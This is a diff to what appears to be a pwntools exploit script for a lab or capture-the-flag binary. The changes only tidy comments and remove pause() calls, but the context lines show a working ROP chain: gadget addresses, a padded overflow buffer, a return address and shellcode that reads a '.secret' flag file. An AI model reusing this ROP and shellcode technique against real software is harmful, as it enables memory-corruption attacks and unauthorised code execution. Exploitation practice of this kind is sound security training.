@@ -37,10 +37,10 @@ sc = asm(shellcraft.cat('10101_YAKOBCHUK_Dmytro.secret') + shellcraft.echo('\n')
 
 # GADGETS
 rnop = p32(0x08049d20)  # ret
-peax = p32(0x080b0cda)  # pop eax ; ret
-peaxedxebx = p32(0x08058958)  # pop eax ; pop edx ; pop ebx ; ret
-mecxeax = p32(0x08093df8)  # mov ecx, eax ; mov eax, ecx ; ret
-syscall = p32(0x08071c50)  # int 0x80 ; ret
+peax = p32(0x080b0cda)  # pop eax; ret
+peaxedxebx = p32(0x08058958)  # pop eax; pop edx; pop ebx; ret
+mecxeax = p32(0x08093df8)  # mov ecx, eax; mov eax, ecx; ret
+syscall = p32(0x08071c50)  # int 0x80; ret
 
 rwx = p32(0x08048000)
 
@@ -75,11 +75,8 @@ buf += rwx
 buf = buf.ljust(4 * overflow + 4 + overflow + 4, b'B')
 buf += p32(0xffffd000)
 
-# pause()
 log.info('=== buffer')
 print(hexdump(buf))
-
-# pause()
 r.readline()
 r.writeline(buf)
 r.readuntil(b'GRANTED!')
